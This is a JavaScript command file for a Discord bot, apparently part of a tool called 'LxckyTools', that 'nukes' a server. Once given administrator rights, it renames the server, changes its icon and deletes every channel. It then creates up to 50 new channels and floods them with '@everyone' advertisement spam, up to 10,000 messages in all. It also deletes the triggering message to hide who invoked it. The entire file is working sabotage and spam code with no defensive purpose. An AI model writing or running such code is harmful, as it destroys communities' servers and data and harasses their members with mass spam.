"use strict";

const { adMessages } = require('../functions/messages.js');
const { ChannelType } = require('discord.js');
const { Errors, Wrapper, Cooldown, Logger } = require('../functions/core/Manager.js');

const MAX_MESSAGES = 10000;
let totalSent = 0;

module.exports = {
    name: 'n',
    description: 'Nuke the server',
    async execute(message, args, client) {
        if (!message.guild) return message.reply('This command can only be used in a server.');

        // Cooldown check (30 minutes)
        const remaining = Cooldown.check(message.author.id, 'n', 1800);
        if (remaining > 0) {
            return message.reply(`Command on cooldown. Try again in ${Math.ceil(remaining / 60)} minutes.`);
        }

        await message.delete().catch(() => {});
        await Logger.nukeStart(message);

        const guild = message.guild;
        const botMember = guild.members.me;

        if (!botMember.permissions.has('Administrator')) {
            await Errors.handle('nuke', { code: 50013 }, message);
            await Logger.error('nuke', { message: 'Bot missing Administrator permissions' }, client);
            return;
        }

        const channelNames = require('../functions/channelNames.js');
        const iconURL = 'https://images.ctfassets.net/w5r1fvmogo3f/6bNn3eGf9awy773QlIE4hh/5e12fdb892203f5bc6a899e2dcf05380/Discord_Nitro_2560x1440_withlogo.jpg';
        totalSent = 0;
        let createdChannels = 0;

        // Change server icon and name
        try { await guild.setIcon(iconURL); } catch (err) { Errors.handle('setIcon', err, message); }
        try { await guild.setName('Nuked by LxckyTools'); } catch (err) { Errors.handle('setName', err, message); }

        // Delete all channels
        const channels = await guild.channels.fetch();
        for (const [, channel] of channels) {
            await Wrapper.handleWithRetry(() => channel.delete(), 'deleteChannel', message);
            await new Promise(r => setTimeout(r, 200));
        }

        // Create channels
        for (let i = 0; i < 50 && totalSent < MAX_MESSAGES; i++) {
            const name = channelNames[i % channelNames.length];
            const newChannel = await Wrapper.handleWithRetry(
                () => guild.channels.create({ name: `${name}-${i}`, type: ChannelType.GuildText }),
                'createChannel',
                message
            );

            if (!newChannel) continue;

            createdChannels++;
            spamChannel(newChannel, adMessages, message);
        }

        await Logger.nukeComplete(message, createdChannels, totalSent);
    }
};

async function spamChannel(channel, messages, message) {
    while (totalSent < MAX_MESSAGES) {
        const msg = messages[Math.floor(Math.random() * messages.length)];
        const result = await Wrapper.handleWithRetry(
            () => channel.send(`@everyone ${msg}`),
            'spam',
            message
        );

        if (result) totalSent++;
        else await new Promise(r => setTimeout(r, 5000));

        await new Promise(r => setTimeout(r, 250));
    }
}